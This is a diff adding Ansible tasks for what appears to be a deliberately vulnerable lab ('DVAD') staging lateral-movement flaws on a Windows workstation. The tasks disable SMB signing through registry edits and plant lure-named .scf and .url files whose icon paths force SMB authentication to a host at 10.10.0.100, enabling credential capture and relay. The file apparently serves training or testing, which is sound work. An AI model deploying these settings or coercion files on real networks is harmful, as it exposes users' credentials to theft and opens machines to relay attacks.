@@ -1,0 +1,46 @@
+---
+# ==============================================================================
+# DVAD - Phase 3: Lateral Movement vulns on ws01.corp.local (attacker host
+# is also the lateral-target in places)
+# ==============================================================================
+
+# ------------------------------------------------------------------------------
+# LAT-028: SMB signing not enforced on workstation (allow SMB relay)
+# ------------------------------------------------------------------------------
+- name: LAT-028 - Disable SMB signing on ws01 (relay precondition)
+  ansible.windows.win_shell: |
+    reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f | Out-Null
+    reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v EnableSecuritySignature /t REG_DWORD /d 0 /f | Out-Null
+    reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f | Out-Null
+  ignore_errors: yes
+
+# ------------------------------------------------------------------------------
+# LAT-033: Drop a malicious .lnk + .scf on a writable share to coerce SMB auth
+# from anyone who browses the share. PublicShare is created by vuln_setup.
+# ------------------------------------------------------------------------------
+- name: LAT-033 - Ensure C:\Shared exists
+  ansible.windows.win_file:
+    path: 'C:\Shared'
+    state: directory
+  ignore_errors: yes
+
+- name: LAT-033 - Drop coercion .scf file in C:\Shared
+  win_copy:
+    dest: 'C:\Shared\HR-Documents.scf'
+    content: |
+      [Shell]
+      Command=2
+      IconFile=\\10.10.0.100\share\icon.ico
+      [Taskbar]
+      Command=ToggleDesktop
+  ignore_errors: yes
+
+- name: LAT-033 - Drop coercion .url file in C:\Shared
+  win_copy:
+    dest: 'C:\Shared\Quarterly-Report.url'
+    content: |
+      [InternetShortcut]
+      URL=file://10.10.0.100/share/index.html
+      IconFile=\\10.10.0.100\share\icon.ico
+      IconIndex=0
+  ignore_errors: yes
